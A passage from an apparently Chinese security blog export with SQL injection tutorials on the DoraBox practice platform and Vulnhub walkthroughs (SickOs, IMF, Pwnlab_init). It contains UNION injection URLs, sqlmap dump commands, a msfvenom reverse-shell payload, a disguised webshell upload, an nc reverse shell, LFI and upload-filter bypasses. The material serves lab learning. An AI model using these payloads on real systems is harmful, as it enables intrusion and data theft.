<p><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317171142022.png" alt="image-20200317171142022"></p>
<p>这里引用别人对dom的解释<br><img src="/2020/03/17/XSS%E8%B7%A8%E7%AB%99/image-20200317171606831.png" alt="image-20200317171606831"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2020/03/17/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>以DoraBox漏洞练习平台来进行本文的实验</p>
<p>项目地址：<a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p>
<h1 id="0x00-SQLi-数字型"><a href="#0x00-SQLi-数字型" class="headerlink" title="0x00 SQLi 数字型"></a><strong>0x00 SQLi 数字型</strong></h1><p>判断表中有多少列<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1%20order%20by%201&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1%20order%20by%201&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=1</a> order by 1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317141900856.png" alt="image-20200317141900856"></p>
<p>依次增大order by 后面的值，直到报错，报错的前一个数为字段数,在order by 4的时候报错，意味着数据库3列</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142013448.png" alt="image-20200317142013448"></p>
<p>union注入的字段为3，此时我们构造注入语句<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,2,3&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,2,3&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> union select 1,2,3&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142133903.png" alt="image-20200317142133903"></p>
<p>可以看到2，3列是显示出来的，所以在这两处插入注入语句<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,concat(user(),%27|%27,database()),3&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20union%20select%201,concat(user(),%27|%27,database()),3&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> union select 1,concat(user(),’|’,database()),3&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317142231491.png" alt="image-20200317142231491"></p>
<p>确定数据库为pentest以后，去暴出表名<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144121314.png" alt="image-20200317144121314"></p>
<p>确定表名以后，去暴出列名<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27account%27&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27account%27&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144212217.png" alt="image-20200317144212217"></p>
<p>根据之前的列名和表名，可构造查询字段内容<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,concat_ws(%27|%27,id,rest,own)%20from%20account&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1%20UNION%20SELECT%201,2,concat_ws(%27|%27,id,rest,own)%20from%20account&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_num.php?id=-1</a> UNION SELECT 1,2,concat_ws(‘|’,id,rest,own) from account&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144340826.png" alt="image-20200317144340826"></p>
<h1 id="0x01-SQLi-字符型"><a href="#0x01-SQLi-字符型" class="headerlink" title="0x01 SQLi 字符型"></a><strong>0x01 SQLi 字符型</strong></h1><p>字符型与数字型的区别在于变量是否用单引号包裹，当不闭合单引号时，没有查询结果</p>
<p>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%20and%201=1&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%20and%201=1&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox</a> and 1=1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317144856486.png" alt="image-20200317144856486"></p>
<p>闭合单引号，成功执行插入的语句<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;</a> and ‘1’=’1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317161405024.png" alt="image-20200317161405024"></p>
<p>接下来的操作，与数字型相同，只需要记得需要闭合单引号<br>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%272%27%20union%20select%201,2,3%27&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox%27%20and%20%271%27=%272%27%20union%20select%201,2,3%27&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_string.php?title=DoraBox&#39;</a> and ‘1’=’2’ union select 1,2,3’&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317161531451.png" alt="image-20200317161531451"></p>
<h1 id="0x02-SQLi-搜索型"><a href="#0x02-SQLi-搜索型" class="headerlink" title="0x02 SQLi 搜索型"></a><strong>0x02 SQLi 搜索型</strong></h1><p>搜索型同时包含单引号和百分号，都需要闭合</p>
<p>[<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%27%20and%20%271%27=%271&amp;submit=submit]</a>(<a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox&#39;" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox&#39;</a> and ‘1’=’1&amp;submit=submit)</p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162517356.png" alt="image-20200317162517356"></p>
<p>引入了注释符，避免受到后面%‘影响<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=1--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=1--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162608701.png" alt="image-20200317162608701"></p>
<p>构造显示显性字段<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,2,3--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,2,3--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162649090.png" alt="image-20200317162649090"></p>
<p>接下来，如同前两种一样，暴出数据信息。<br><a href="http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,concat_ws(%27|%27,id,title,content),3%20from%20news--+&amp;submit=submit" target="_blank" rel="noopener">http://106.13.42.155:91/DoraBox-master/sql_injection/sql_search.php?content=DoraBox%%27%20and%201=2%20union%20select%201,concat_ws(%27|%27,id,title,content),3%20from%20news--+&amp;submit=submit</a></p>
<p><img src="/2020/03/17/SQL%E6%B3%A8%E5%85%A5/image-20200317162826195.png" alt="image-20200317162826195"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>X-Forwarded-For注入</title>
    <url>/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x00-fuzz测试"><a href="#0x00-fuzz测试" class="headerlink" title="0x00 fuzz测试"></a><strong>0x00 fuzz测试</strong></h1><p>打开页面发现是个登陆后台，登录框随便输入试试<br>发现有乱码 到firefox的F12看看响应</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112017843.png" alt="image-20200316112017843"></p>
<p>告诉我们ip已经记录　<br>服务端获取客户端IP地址的方式,其中一种是通过读取请求中X-Forwarded-For的字段值，确认服务端是不是使用这种方式获取客户端IP地址<br>编辑刚才的请求，在请求头中加入X-Forwarded-For:121.8.146.99(这个是我们伪造的IP地址，随便填一个合法的IP地址即可)，然后重新发送</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112843791.png" alt="image-20200316112843791"></p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316112913342.png" alt="image-20200316112913342"></p>
<p>可以看到，之前随意填的X-Forwarded-For字段中的IP地址 121.8.146.99 已经被记录了，这就确认了服务端是通过读取X-Forwarded-For的字段值来获取客户端的IP地址的<br>下面直接用SQLMAP确认X-Forwarded-For存在SQL注入漏洞</p>
<h1 id="0x01-sqlmap跑注入"><a href="#0x01-sqlmap跑注入" class="headerlink" title="0x01 sqlmap跑注入"></a><strong>0x01 sqlmap跑注入</strong></h1><p>将第二次登录请求的信息摘下来，新建成txt文件，这里我命名为x-forwarded-for.txt，并将x-forwarded-for的值改为*</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316113807808.png" alt="image-20200316113807808"></p>
<p>sqlmap -r x-forwarded-for.txt –batch<br>需要在x-forwarded-for.txt文件所在的目录中跑</p>
<h2 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h2><p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114245921.png" alt="image-20200316114245921"></p>
<h2 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h2><p>sqlmap -r x-forwarded-for.txt –batch –dbs</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114550478.png" alt="image-20200316114550478"></p>
<h2 id="查询当前数据库库"><a href="#查询当前数据库库" class="headerlink" title="查询当前数据库库"></a>查询当前数据库库</h2><p>sqlmap -r x-forwarded-for.txt –batch –current-db</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114645795.png" alt="image-20200316114645795"></p>
<h2 id="查询获取数据库中表"><a href="#查询获取数据库中表" class="headerlink" title="查询获取数据库中表"></a>查询获取数据库中表</h2><p>sqlmap -r x-forwarded-for.txt –batch -D “webcalendar” –tables</p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316114838304.png" alt="image-20200316114838304"></p>
<h2 id="查询表的字段"><a href="#查询表的字段" class="headerlink" title="查询表的字段"></a>查询表的字段</h2><p>以user为例：sqlmap -r x-forwarded-for.txt –batch -T “user”  -D “webcalendar” –columns </p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316115145834.png" alt="image-20200316115145834"></p>
<h2 id="查询表的内容"><a href="#查询表的内容" class="headerlink" title="查询表的内容"></a>查询表的内容</h2><p>sqlmap -r x-forwarded-for.txt -T “user” -D “webcalendar” -C “id,username,password” –batch –dump </p>
<p><img src="/2020/03/16/X-Forwarded-For%E6%B3%A8%E5%85%A5/image-20200316122534470.png" alt="image-20200316122534470"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SickOs1.2</title>
    <url>/2020/03/15/SickOs1-2/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/15/SickOs1-2/image-20200315180547120.png" alt="image-20200315180547120"></p>
<p>dirb扫目录 发现个test</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315181814090.png" alt="image-20200315181814090"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185800832.png" alt="image-20200315185800832"></p>
<h1 id="0x01-获取shell"><a href="#0x01-获取shell" class="headerlink" title="0x01 获取shell"></a><strong>0x01 获取shell</strong></h1><p>发现可以PUT 那么试试直接上传文件</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185640271.png" alt="image-20200315185640271"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315185902815.png" alt="image-20200315185902815"></p>
<p>连接成功</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315190043984.png" alt="image-20200315190043984"></p>
<p>用的中国蚁剑 打开虚拟终端</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315190529395.png" alt="image-20200315190529395"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315190947639.png" alt="image-20200315190947639"></p>
<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>还是老规矩msf走起</p>
<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=443 &gt;/root/shell_443.php<br>用中国蚁剑上传上去 本地监听 拿到shell</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201428099.png" alt="image-20200315201428099"></p>
<p>shell放到后台 search chkrootokit的exp然后加载到后台shell里<br>注意这时候443会被重置为exp里设定的4444<br>由于靶机防火墙不允许非常用端口的使用所以我们需要使用443来操作<br>重新set lport 443</p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201530617.png" alt="image-20200315201530617"></p>
<p><img src="/2020/03/15/SickOs1-2/image-20200315201742942.png" alt="image-20200315201742942"></p>
<p>拿到root！</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>SickOs1.1</title>
    <url>/2020/03/15/SickOs1-1/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/15/SickOs1-1/image-20200315143529889.png" alt="image-20200315143529889"></p>
<p>3128有代理  nikto扫一下</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145113192.png" alt="image-20200315145113192"></p>
<p>用nikto扫描出很多信息…透露了/cgi-bin/status位置（容易受到shellshock攻击），这边还存在robots.txt ，访问下robots挂上代理，我用的谷歌插件</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145554846.png" alt="image-20200315145554846"></p>
<p>访问下80 根据提示在访问下wolfcms</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145611556.png" alt="image-20200315145611556"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315145646346.png" alt="image-20200315145646346"></p>
<p>网上搜到这个cms的登陆界面是<a href="http://192.168.0.103/wolfcms/?/admin/login" target="_blank" rel="noopener">http://192.168.0.103/wolfcms/?/admin/login</a></p>
<p>admin admin弱口令进去</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315150009521.png" alt="image-20200315150009521"></p>
<p>我们看到了这里有上传页面 接下来就是做个马上传提权，大概就是这样了</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315150043417.png" alt="image-20200315150043417"></p>
<h1 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传"></a><strong>0x01 文件上传</strong></h1><p><img src="/2020/03/15/SickOs1-1/image-20200315150534277.png" alt="image-20200315150534277"></p>
<p>msf接 python获取tty 我们现在受伤已经有www权限了 那么就是提权了接下来<br><img src="/2020/03/15/SickOs1-1/image-20200315152344144.png" alt="image-20200315152344144"></p>
<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>了解下站点结构 找到config.php寻找密码</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152649835.png" alt="image-20200315152649835"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152718022.png" alt="image-20200315152718022"></p>
<p>直接root不行 了解到passwd文件里的提示 sickos是第一用户 直接su过去</p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315152900190.png" alt="image-20200315152900190"></p>
<p>权限还是不对 再sudo -i 可以了 </p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315153249332.png" alt="image-20200315153249332"></p>
<p><img src="/2020/03/15/SickOs1-1/image-20200315153348379.png" alt="image-20200315153348379"></p>
<p>第一关通过！</p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>IMF</title>
    <url>/2020/03/14/IMF/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/14/IMF/image-20200314185633352.png" alt="image-20200314185633352"></p>
<p>就一个80</p>
<h1 id="0x01-flag1"><a href="#0x01-flag1" class="headerlink" title="0x01 flag1"></a><strong>0x01 flag1</strong></h1><p>看源码就行了</p>
<p><img src="/2020/03/14/IMF/image-20200314185815358.png" alt="image-20200314185815358"></p>
<p>base64解这个flag 提示我们allthefiles<img src="/2020/03/14/IMF/image-20200314185917680.png" alt="image-20200314185917680"></p>
<h1 id="0x02-flag2"><a href="#0x02-flag2" class="headerlink" title="0x02 flag2"></a><strong>0x02 flag2</strong></h1><p>我们再细看 这几行js有点怪 拼起来得到flag2 提示imfadministrator</p>
<p><img src="/2020/03/14/IMF/image-20200314190308552.png" alt="image-20200314190308552"></p>
<p><img src="/2020/03/14/IMF/image-20200314190426313.png" alt="image-20200314190426313"></p>
<p><img src="/2020/03/14/IMF/image-20200314190511844.png" alt="image-20200314190511844"></p>
<h1 id="0x03-flag3"><a href="#0x03-flag3" class="headerlink" title="0x03 flag3"></a><strong>0x03 flag3</strong></h1><p>根据给的路径发现登陆页面<br>根据回显发现rmichaels用户名存在<br>查看源码发现密码使用硬编码<br>如果是硬编码的，我们猜测他使用了strcmp函数，strcmp()是对于相等的字符串返回0，不同的字符串返回非0，但如果比较非字符串，strcmp()将返回null。在php中null==0是true。使得数组看起来与硬编码的密码字符串匹配。<br>所以我们此处传一个数组，将pass字段重命名为pass[]。<br>用户名使用rmichaels，将pass字段重命名为pass[]。</p>
<p><img src="/2020/03/14/IMF/image-20200314220716954.png" alt="image-20200314220716954"></p>
<p><img src="/2020/03/14/IMF/image-20200314220834567.png" alt="image-20200314220834567"></p>
<p><img src="/2020/03/14/IMF/image-20200314220905157.png" alt="image-20200314220905157"></p>
<h1 id="0x04-flag4"><a href="#0x04-flag4" class="headerlink" title="0x04 flag4"></a><strong>0x04 flag4</strong></h1><p>进到IMF里pagename参数有个upload有注入 sqlmap走起</p>
<p><img src="/2020/03/14/IMF/image-20200314221515461.png" alt="image-20200314221515461"></p>
<p>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” –dbs</p>
<p><img src="/2020/03/14/IMF/image-20200314222022401.png" alt="image-20200314222022401"></p>
<p>跑admin<br>sqlmap -u “<a href="http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;" target="_blank" rel="noopener">http://192.168.0.103/imfadministrator/cms.php?pagename=upload&quot;</a> –cookie “PHPSESSID=dfij6638dhhltl0vplg5q71um3” -D admin –tables<br><img src="/2020/03/14/IMF/image-20200314222132550.png" alt="image-20200314222132550"></p>
<p>新页面<br><img src="/2020/03/14/IMF/image-20200314222241091.png" alt="image-20200314222241091"></p>
<p><img src="/2020/03/14/IMF/image-20200314222527908.png" alt="image-20200314222527908"></p>
<p>扫扫更健康</p>
<p><img src="/2020/03/14/IMF/image-20200314233209089.png" alt="image-20200314233209089"></p>
<p>解码<br><img src="/2020/03/14/IMF/image-20200314222659426.png" alt="image-20200314222659426"></p>
<h1 id="0x05-flag5"><a href="#0x05-flag5" class="headerlink" title="0x05 flag5"></a><strong>0x05 flag5</strong></h1><p>访问下解码后的php</p>
<p><img src="/2020/03/14/IMF/image-20200314222754725.png" alt="image-20200314222754725"></p>
<p>亲自试水 常规上传别试了 上weevely吧<br>weevely generate t00r ~/shell.php<br><img src="/2020/03/14/IMF/image-20200314223138650.png" alt="image-20200314223138650"><br>改个文件头 文件后缀也变gif<br><img src="/2020/03/14/IMF/image-20200314223316403.png" alt="image-20200314223316403"><br>上传成功</p>
<p><img src="/2020/03/14/IMF/image-20200314224722194.png" alt="image-20200314224722194"></p>
<p>源码里这个就是文件落地后的名字<br><img src="/2020/03/14/IMF/image-20200314225025848.png" alt="image-20200314225025848"></p>
<p>连接后查看flag5 解码<br><img src="/2020/03/14/IMF/image-20200314225510979.png" alt="image-20200314225510979"><br>提示agentservices</p>
<h1 id="0x06-flag6"><a href="#0x06-flag6" class="headerlink" title="0x06 flag6"></a><strong>0x06 flag6</strong></h1><p>nc去弄个交互式shell<br>攻击机：nc -lvp 2333<br>靶机：:backdoor_reversetcp 192.168.0.106 2333<br><img src="/2020/03/14/IMF/image-20200314230121345.png" alt="image-20200314230121345"></p>
<p>ps -aux看看进程 发现有knock进程怪不得开始信息收集时候只有80端口<br><img src="/2020/03/14/IMF/image-20200314230358950.png" alt="image-20200314230358950"><br>再看看网络 netstat -antp 发现个7788</p>
<p><img src="/2020/03/14/IMF/image-20200314230649667.png" alt="image-20200314230649667"></p>
<p>进一步了解下 之前的flag5提示我们也是代理</p>
<p><img src="/2020/03/14/IMF/image-20200314230734515.png" alt="image-20200314230734515"></p>
<p>find全局查agent文件 打开两个</p>
<p><img src="/2020/03/14/IMF/image-20200314231323432.png" alt="image-20200314231323432"></p>
<p>根据敲门密码 敲端口</p>
<p><img src="/2020/03/14/IMF/image-20200314232557766.png" alt="image-20200314232557766"></p>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnlab_init</title>
    <url>/2020/03/12/Pwnlab-init/</url>
    <content><![CDATA[<h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a><strong>0x00 信息收集</strong></h1><p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312222520688.png" alt="image-20200312222520688"></p>
<p>发现80端口的url是这样的</p>
<p> <a href="http://192.168.0.104/?page=login" target="_blank" rel="noopener">http://192.168.0.104/?page=login</a><br> <a href="http://192.168.0.104/?page=upload" target="_blank" rel="noopener">http://192.168.0.104/?page=upload</a></p>
<ol>
<li>可能存在 LFI 漏洞</li>
<li>构造URL <a href="http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login" target="_blank" rel="noopener">http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login</a></li>
<li>发现可以包含读到文件，然后base64解密</li>
</ol>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312223045306.png" alt="image-20200312223045306"></p>
<p>代码如下</p>
<p>—login.php—</p>
<p><code>&lt;?php
session_start();require(&quot;config.php&quot;);server, password, $database);if (isset(POST[&#39;pass&#39;]))
{
    POST[&#39;user&#39;];
    _POST[&#39;pass&#39;]);$stmt = $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user=? AND pass=?&quot;);
$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);
$stmt-&gt;execute();
$stmt-&gt;store_Result();
if ($stmt-&gt;num_rows == 1)
{
    $_SESSION[&#39;user&#39;] = $luser;
    header(&#39;Location: ?page=upload&#39;);
}
else
{
    echo &quot;Login failed.&quot;;
}    &lt;?php
}Username: 
Password: 
}
else
{
    ?&gt;</code></p>
<p>跟着再把<code>require</code>中的config读出来</p>
<p><code>&lt;?php
$server   = &quot;localhost&quot;;
$username = &quot;root&quot;;
$password = &quot;H4u%QJ_H99&quot;;
$database = &quot;Users&quot;;
?&gt;%</code></p>
<p>顺便也把index和upload的也读了</p>
<p>—index—</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312234059880.png" alt="image-20200312234059880"></p>
<p>—upload—</p>
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>

<?php 
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] <= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(".jpg",".jpeg",".gif",".png"); 


    if (!(in_array($file_ext, $whitelist))) {
        die('Not allowed extension, please upload images only.');
    }

    if(strpos($filetype,'image') === false) {
        die('Error 001');
    }

    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
        die('Error 002');
    }

    if(substr_count($filetype, '/')>1){
        die('Error 003');
    }

    $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
        echo "<img src="/2020/03/12/Pwnlab-init/"".$uploadfile."\""><br>";
    } else {
        die('Error 4');
    }
}
}

?><p>%</p>
<p>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</p>
<p>mysql -h 192.168.0.104 -u root -D Users -p密码是config文件的那个</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312224817346.png" alt="image-20200312224817346"></p>
<p>拿到用户名</p>
<h1 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a><strong>0x01 Bypass</strong></h1><p>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312225323119.png" alt="image-20200312225323119"></p>
<p>加个图片标志绕过</p>
<p>burp上传回来个相对路径 upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</p>
<p><img src="/2020/03/12/Pwnlab-init/image-20200312230453184.png" alt="image-20200312230453184"></p>
<p>让他弹回来 用cookie传入路径</p>
